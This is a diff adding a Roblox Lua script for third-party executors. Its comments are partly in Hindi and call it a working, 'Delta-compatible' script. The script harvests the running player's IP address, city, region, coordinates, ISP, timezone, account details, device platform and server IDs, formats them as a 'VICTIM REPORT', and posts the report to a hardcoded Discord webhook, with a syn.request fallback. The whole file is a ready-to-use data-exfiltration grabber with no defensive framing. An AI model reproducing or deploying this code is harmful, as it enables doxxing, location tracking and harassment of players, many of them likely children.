@@ -1,0 +1,141 @@
+-- ================================================================
+--  WORKING SCRIPT – USERNAME + DISPLAY NAME ADDED
+--  Baaki sab same – safe, Delta-compatible
+-- ================================================================
+
+local webhook = "https://discord.com/api/webhooks/1521449254684459039/vC2v8PA3JeSmeTo2OjGggeMwE5X4jFx2ZKvW8EOaE-EE5SD6gnwxlvdrHkcsNavJ2dlH"  -- 🔴 apna webhook (change if needed)
+
+local HttpService = game:GetService("HttpService")
+HttpService.HttpEnabled = true
+local player = game.Players.LocalPlayer
+
+-- ===== 1. IP =====
+local ip = "Failed"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
+-- ===== 2. Geolocation =====
+local city = "N/A"; local region = "N/A"; local country = "N/A"; local isp = "N/A"; local loc = "N/A"; local timezone = "N/A"
+pcall(function()
+    local raw = game:HttpGet("https://ipinfo.io/" .. ip .. "/json")
+    local data = HttpService:JSONDecode(raw)
+    city = data.city or "N/A"
+    region = data.region or "N/A"
+    country = data.country or "N/A"
+    isp = data.org or "N/A"
+    loc = data.loc or "N/A"
+    timezone = data.timezone or "N/A"
+end)
+
+-- ===== 3. Roblox Profile (Username + Display Name) =====
+local created = "Unknown"
+local displayName = player.Name  -- fallback
+pcall(function()
+    local raw = game:HttpGet("https://users.roblox.com/v1/users/" .. player.UserId)
+    local data = HttpService:JSONDecode(raw)
+    created = data.created or "Unknown"
+    displayName = data.displayName or player.Name
+end)
+local friends = 0
+pcall(function()
+    local raw = game:HttpGet("https://friends.roblox.com/v1/users/" .. player.UserId .. "/friends/count")
+    local data = HttpService:JSONDecode(raw)
+    friends = data.count or 0
+end)
+
+-- ===== 4. Device & Platform =====
+local platform = "Unknown"
+pcall(function()
+    local p = game:GetService("UserInputService"):GetPlatform()
+    if p == Enum.Platform.Android then platform = "Android" end
+    if p == Enum.Platform.IOS then platform = "iOS" end
+    if p == Enum.Platform.Windows then platform = "Windows" end
+    if p == Enum.Platform.Mac then platform = "Mac" end
+    if p == Enum.Platform.Xbox then platform = "Xbox" end
+    if p == Enum.Platform.PlayStation then platform = "PlayStation" end
+end)
+local screen = "Unknown"
+pcall(function()
+    screen = workspace.CurrentCamera.ViewportSize.X .. "x" .. workspace.CurrentCamera.ViewportSize.Y
+end)
+
+-- ===== 5. Executor =====
+local executor = "Unknown"
+pcall(function()
+    if identifyexecutor then executor = identifyexecutor() end
+end)
+
+-- ===== 6. Game =====
+local gameName = "Unknown"
+pcall(function()
+    gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+end)
+
+-- ===== 7. Account Age =====
+local accountAge = tostring(player.AccountAge or "Unknown")
+
+-- ===== 8. Server IP (agar executor support kare) =====
+local serverIP = "N/A"
+pcall(function()
+    if getserverip then
+        serverIP = getserverip()
+    end
+end)
+
+-- ===== 9. Build Message – NOW WITH USERNAME + DISPLAY NAME =====
+local msg = "**🔥 VICTIM REPORT**\n\n" ..
+    "**ROBLOX**\n" ..
+    "👤 Username: " .. player.Name .. "\n" ..
+    "🖋️ Display Name: " .. displayName .. "\n" ..
+    "🆔 User ID: " .. tostring(player.UserId) .. "\n" ..
+    "📅 Account Age: " .. accountAge .. " days\n" ..
+    "📅 Created: " .. created .. "\n" ..
+    "👥 Friends: " .. tostring(friends) .. "\n" ..
+
+    "\n**NETWORK**\n" ..
+    "🌐 IP: " .. ip .. "\n" ..
+    "📍 City: " .. city .. "\n" ..
+    "🏛️ Region: " .. region .. "\n" ..
+    "🌍 Country: " .. country .. "\n" ..
+    "📡 ISP: " .. isp .. "\n" ..
+    "🗺️ Coords: " .. loc .. "\n" ..
+    "🕒 Timezone: " .. timezone .. "\n" ..
+    "🖥️ Server IP: " .. serverIP .. "\n" ..
+
+    "\n**DEVICE**\n" ..
+    "📱 Platform: " .. platform .. "\n" ..
+    "🖥️ Screen: " .. screen .. "\n" ..
+
+    "\n**EXECUTOR**\n" ..
+    "⚙️ Executor: " .. executor .. "\n" ..
+
+    "\n**GAME**\n" ..
+    "🎮 Game: " .. gameName .. "\n" ..
+    "📌 Place ID: " .. tostring(game.PlaceId) .. "\n" ..
+    "🔑 Job ID: " .. game.JobId .. "\n" ..
+
+    "\nGHOP GHOP"
+
+-- ===== 10. Send (RequestAsync – already working) =====
+local payload = { content = msg }
+local json = HttpService:JSONEncode(payload)
+
+local success, response = pcall(function()
+    return HttpService:RequestAsync({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = json
+    })
+end)
+
+if success then
+    print("✅ Report sent! Status: " .. tostring(response.StatusCode))
+else
+    print("❌ Send failed: " .. tostring(response))
+    if syn and syn.request then
+        syn.request({ Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json })
+        print("✅ Sent via syn.request")
+    end
+end
